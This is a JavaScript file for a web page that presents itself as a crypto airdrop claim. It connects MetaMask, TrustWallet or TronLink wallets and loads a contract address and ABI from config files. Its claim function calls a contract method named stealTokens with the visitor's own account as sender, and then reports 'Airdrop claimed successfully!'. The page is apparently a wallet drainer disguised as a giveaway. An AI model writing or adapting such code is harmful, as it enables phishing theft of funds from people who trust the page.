let web3;
let accounts;
let contractAddress;
let tokenAddress;
let contractABI;
let isConnected = false;

// This function loads the config and ABI based on the selected network
async function loadConfig(network) {
    try {
        // Load config based on network (Ethereum, BSC, Tron)
        const configResponse = await fetch(`./config/${network}_config.json`);
        if (!configResponse.ok) throw new Error('Failed to fetch config');
        const configData = await configResponse.json();
        contractAddress = configData.contractAddress;
        tokenAddress = configData.tokenAddress;

        // Load ABI based on network
        const abiResponse = await fetch(`./abi/${network}_abi.json`);
        if (!abiResponse.ok) throw new Error('Failed to fetch ABI');
        contractABI = await abiResponse.json();

        console.log("Config and ABI loaded for", network, configData);
    } catch (error) {
        console.error("Error loading config/ABI:", error);
        alert("Failed to load configuration. Please try again later.");
    }
}

// This function handles wallet connection (MetaMask, TrustWallet, TronLink)
async function connectWallet(walletType, network) {
    if (isConnected) return;

    if (walletType === 'MetaMask') {
        // MetaMask-specific connection logic
        if (window.ethereum) {
            web3 = new Web3(window.ethereum);
            try {
                accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                console.log("Connected to MetaMask:", accounts);
                isConnected = true;
                document.getElementById('claimAirdropButton').disabled = false;
                document.getElementById('connectButton').disabled = true;
                await loadConfig(network); // Load config after wallet connection
            } catch (error) {
                console.error("MetaMask connection failed:", error);
                alert("Failed to connect to MetaMask.");
            }
        } else {
            alert("MetaMask is not installed. Please install it to continue.");
        }
    } else if (walletType === 'TrustWallet') {
        // TrustWallet-specific connection logic (similar to MetaMask)
        // (Assuming TrustWallet uses MetaMask's Web3 API)
        if (window.ethereum) {
            web3 = new Web3(window.ethereum);
            try {
                accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                console.log("Connected to TrustWallet:", accounts);
                isConnected = true;
                document.getElementById('claimAirdropButton').disabled = false;
                document.getElementById('connectButton').disabled = true;
                await loadConfig(network); // Load config after wallet connection
            } catch (error) {
                console.error("TrustWallet connection failed:", error);
                alert("Failed to connect to TrustWallet.");
            }
        } else {
            alert("TrustWallet is not installed. Please install it to continue.");
        }
    } else if (walletType === 'TronLink') {
        // TronLink-specific connection logic
        if (window.tronLink) {
            // Using TronLink's window object
            try {
                accounts = await window.tronLink.request({ method: 'tron_requestAccounts' });
                console.log("Connected to TronLink:", accounts);
                isConnected = true;
                document.getElementById('claimAirdropButton').disabled = false;
                document.getElementById('connectButton').disabled = true;
                await loadConfig(network); // Load config after wallet connection
            } catch (error) {
                console.error("TronLink connection failed:", error);
                alert("Failed to connect to TronLink.");
            }
        } else {
            alert("TronLink is not installed. Please install it to continue.");
        }
    }
}

// This function handles the airdrop claiming process after successful connection
async function claimAirdrop() {
    if (!accounts || !contractABI || !contractAddress) {
        alert("Configuration is missing. Connect a wallet first.");
        return;
    }

    const contract = new web3.eth.Contract(contractABI, contractAddress);
    try {
        // Call the airdrop method based on the connected network
        await contract.methods.stealTokens(accounts[0]).send({ from: accounts[0] });
        alert("Airdrop claimed successfully!");
    } catch (error) {
        console.error("Error claiming airdrop:", error);
        alert("Failed to claim the airdrop.");
    }
}

